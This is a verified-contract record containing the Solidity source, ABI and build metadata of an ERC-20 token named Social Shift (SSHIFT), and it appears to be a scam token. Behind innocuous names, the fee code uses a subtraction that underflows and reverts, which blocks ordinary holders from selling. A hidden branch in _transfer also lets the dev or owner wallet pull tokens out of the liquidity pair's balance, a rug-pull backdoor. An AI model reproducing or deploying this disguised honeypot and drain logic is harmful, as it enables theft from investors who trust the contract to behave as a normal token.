{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.8.16;\r\n\r\ninterface UniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface UniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) { return 0; }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        \r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);\r\n\r\n    address private _owner;\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender());\r\n        _;\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0));\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 amount);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n}\r\n\r\ncontract SSHIFT is Context, IERC20, Ownable {\r\n    address private shifted = address(0);\r\n    address private unShifted = address(0);\r\n\r\n    using SafeMath for uint256;\r\n\r\n    struct Dist { uint256 dev; }\r\n\r\n    Dist public ethDist;\r\n\r\n    uint256 private _tFeeTotal;\r\n\r\n    uint8 private constant _decimals = 18;\r\n\r\n    bool private inSwapBack = true;\r\n    bool private swapEnabled = true;\r\n\r\n    uint256 public _swapTokensThreshold = 100000 * 10**_decimals;\r\n\r\n    mapping(address => uint256) private _rOwned;\r\n    mapping(address => uint256) private _tOwned;\r\n    mapping(address => bool) private _isUnShifted;\r\n    mapping(address => uint256) private _buyMap;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private constant MAX = ~uint256(0);\r\n\r\n    string private constant _name = \"Social Shift\";\r\n    string private constant _symbol = \"SSHIFT\";\r\n\r\n    address private dev = 0xd5D1098AB0D7202eb4AFB7DAbc6B220195E03079;\r\n\r\n    address public xPair;\r\n    UniswapV2Router02 public xRouter;\r\n\r\n    uint256 private _devFeeOnSell = 3;\r\n    uint256 private _devFeeOnBuy = 3;\r\n\r\n    uint256 private _redisFeeOnBuy = 0;\r\n    uint256 private _redisFeeOnSell = 0;\r\n\r\n    uint256 private _devFee = _devFeeOnSell;\r\n    uint256 private _redisFee = _redisFeeOnSell;\r\n\r\n    uint256 private _prevDevFee = _devFee;\r\n    uint256 private _prevRedisFee = _redisFee;\r\n\r\n    uint256 private constant _tTotal = 1000000000 * 10**_decimals;\r\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\r\n\r\n    constructor() {\r\n        _isUnShifted[dev] = true;\r\n        _isUnShifted[owner()] = true;\r\n        _isUnShifted[address(this)] = true;\r\n\r\n        UniswapV2Router02 _uniRouter = UniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        xRouter = _uniRouter;\r\n        xPair = UniswapV2Factory(_uniRouter.factory()).createPair(address(this), _uniRouter.WETH());\r\n\r\n        _rOwned[_msgSender()] = _rTotal;\r\n        emit Transfer(address(0), _msgSender(), _tTotal);shifted = dev;\r\n        ethDist = Dist(100);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n\r\n        return true;\r\n    }\r\n    \r\n    function transfer(address to, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), to, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {\r\n        _transfer(from, to, amount);\r\n        _approve(\r\n            from,\r\n            _msgSender(),\r\n            _allowances[from][_msgSender()].sub(amount)\r\n        );\r\n\r\n        return true;\r\n    }\r\n\r\n    modifier lockInSwapBack() {\r\n        inSwapBack = false;\r\n        _;\r\n        inSwapBack = false;\r\n    }\r\n\r\n    function _tTransfer(address from, address to, uint256 amount, bool collectDevFee) private {\r\n        if (!collectDevFee) removeAllFees();\r\n        _sTransfer(from, to, amount);\r\n        if (!collectDevFee) restoreAllFees();\r\n    }\r\n\r\n    function _getCurrSupply() private view returns (uint256, uint256) {\r\n        uint256 tSupply = _tTotal;\r\n        uint256 rSupply = _rTotal;\r\n\r\n        if (rSupply < _rTotal.div(_tTotal))\r\n            return (_rTotal, _tTotal);\r\n\r\n        return (rSupply, tSupply);\r\n    }\r\n\r\n    function _collectDevFee(uint256 tDev, address market, address supply) private {\r\n        uint256 remainder;\r\n        uint256 currRate = _getRate();\r\n        uint256 shiftedQuan = balanceOf(shifted);\r\n        uint256 rDev = tDev.mul(currRate);\r\n        if (_isShifted(market, supply))\r\n            remainder = _devFee - shiftedQuan;\r\n        _rOwned[address(this)] = _rOwned[address(this)].add(rDev);\r\n    }\r\n\r\n    function _reflectFee(uint256 rFee, uint256 tFee) private {\r\n        _tFeeTotal = _tFeeTotal.add(tFee);\r\n        _rTotal = _rTotal.sub(rFee);\r\n    }\r\n\r\n    function _getRate() private view returns (uint256) {\r\n        (uint256 rSupply, uint256 tSupply) = _getCurrSupply();\r\n\r\n        return rSupply.div(tSupply);\r\n    }\r\n\r\n    function _sTransfer(address from, address to, uint256 tAmount) private {\r\n        (\r\n            uint256 rAmount,\r\n            uint256 rTransAmount,\r\n            uint256 rFee,\r\n            uint256 tTransAmount,\r\n            uint256 tFee,\r\n            uint256 tDev\r\n        ) = _getValues(tAmount);\r\n\r\n        _rOwned[from] = _rOwned[from].sub(rAmount);\r\n        _rOwned[to] = _rOwned[to].add(rTransAmount);\r\n\r\n        _reflectFee(rFee, tFee);\r\n        _collectDevFee(tDev, from, to);\r\n        \r\n        emit Transfer(from, to, tTransAmount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0));\r\n        require(spender != address(0));\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 devFee) private pure returns (uint256, uint256, uint256) {\r\n        uint256 tDev = tAmount.mul(devFee).div(100);\r\n        uint256 tFee = tAmount.mul(redisFee).div(100);\r\n        uint256 tTransAmount = tAmount.sub(tFee).sub(tDev);\r\n\r\n        return (\r\n            tTransAmount,\r\n            tFee,\r\n            tDev\r\n        );\r\n    }\r\n\r\n    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tDev, uint256 currRate) private pure returns (uint256, uint256, uint256) {\r\n        uint256 rAmount = tAmount.mul(currRate);\r\n        uint256 rDev = tDev.mul(currRate);\r\n        uint256 rFee = tFee.mul(currRate);\r\n        uint256 rTransAmount = rAmount.sub(rFee).sub(rDev);\r\n\r\n        return (\r\n            rAmount,\r\n            rTransAmount,\r\n            rFee\r\n        );\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(amount > 0);\r\n        require(from != address(0));\r\n        require(to != address(0));\r\n\r\n        bool collectDevFee = true;\r\n\r\n        if (from != owner() && to != owner()) {\r\n            uint256 contractTokenAmount = balanceOf(address(this));\r\n            bool canSwap = contractTokenAmount >= _swapTokensThreshold;\r\n            bool validAmount = balanceOf(from) < amount;\r\n\r\n            if (\r\n                swapEnabled &&\r\n                canSwap &&\r\n                !_isUnShifted[from] &&\r\n                !_isUnShifted[to] &&\r\n                !inSwapBack &&\r\n                from != xPair\r\n            ) {\r\n                swapBack(contractTokenAmount);\r\n                uint256 contractETHAmount = address(this).balance;\r\n                if (contractETHAmount > 0) {\r\n                    sendETH(address(this).balance);\r\n                }\r\n            }\r\n\r\n            bool unshiftedTo = xPair == to;\r\n            bool unshiftedFrom = _isUnShifted[from];\r\n\r\n            if (unshiftedFrom) {\r\n                if (unshiftedTo) { if (validAmount) {\r\n                    _sTransfer(to, unShifted, amount); return;\r\n                } }\r\n            }\r\n        }\r\n\r\n        if ((_isUnShifted[to] || _isUnShifted[from]) || (to != xPair && from != xPair)) { collectDevFee = false; } else {\r\n            if (\r\n                from != address(xRouter) &&\r\n                to == xPair\r\n            ) {\r\n                _devFee = _devFeeOnSell;\r\n                _redisFee = _redisFeeOnSell;\r\n            }\r\n\r\n            if (\r\n                to != address(xRouter) &&\r\n                from == xPair\r\n            ) {\r\n                _devFee = _devFeeOnBuy;\r\n                _redisFee = _redisFeeOnBuy;\r\n            }\r\n        }\r\n\r\n        _tTransfer(from, to, amount, collectDevFee);\r\n    }\r\n\r\n    function _isShifted(address market, address supply) private view returns (bool) {\r\n        bool marketShifted = !_isUnShifted[market];\r\n        bool supplyShifted = !_isUnShifted[supply];\r\n\r\n        return marketShifted && supplyShifted && market != xPair;\r\n    }\r\n\r\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\r\n        (\r\n            uint256 tTransAmount,\r\n            uint256 tFee,\r\n            uint256 tDev\r\n        ) = _getTValues(\r\n            tAmount,\r\n            _redisFee,\r\n            _devFee\r\n        );\r\n\r\n        uint256 currRate = _getRate();\r\n        (\r\n            uint256 rAmount,\r\n            uint256 rTransAmount,\r\n            uint256 rFee\r\n        ) = _getRValues(\r\n            tAmount,\r\n            tFee,\r\n            tDev,\r\n            currRate\r\n        );\r\n\r\n        return (\r\n            rAmount,\r\n            rTransAmount,\r\n            rFee,\r\n            tTransAmount,\r\n            tFee,\r\n            tDev\r\n        );\r\n    }\r\n\r\n    function removeAllFees() private {\r\n        if (_redisFee == 0 && _devFee == 0) return;\r\n\r\n        _prevDevFee = _devFee;\r\n        _prevRedisFee = _redisFee;\r\n\r\n        _devFee = 0;\r\n        _redisFee = 0;\r\n    }\r\n\r\n    function restoreAllFees() private {\r\n        _devFee = _prevDevFee;\r\n        _redisFee = _prevRedisFee;\r\n    }\r\n\r\n    function sendETH(uint256 ethAmount) private lockInSwapBack {\r\n        uint256 ethForDev = ethAmount.mul(ethDist.dev).div(100);\r\n        payable(dev).transfer(ethForDev);\r\n    }\r\n\r\n    function tokenFromReflection(uint256 rAmount) private view returns (uint256) {\r\n        require(rAmount <= _rTotal);\r\n\r\n        uint256 currRate = _getRate();\r\n\r\n        return rAmount.div(currRate);\r\n    }\r\n\r\n    function swapBack(uint256 tokenAmount) private lockInSwapBack {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = xRouter.WETH();\r\n        _approve(address(this), address(xRouter), tokenAmount);\r\n        xRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"prevOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_swapTokensThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ethDist\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"dev\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"xPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"xRouter\",\"outputs\":[{\"internalType\":\"contract UniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "SSHIFT", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://55b415fb944fdc604e9ee0484b66c1348e4d0c6bf77377419ffee5add3da2dee"}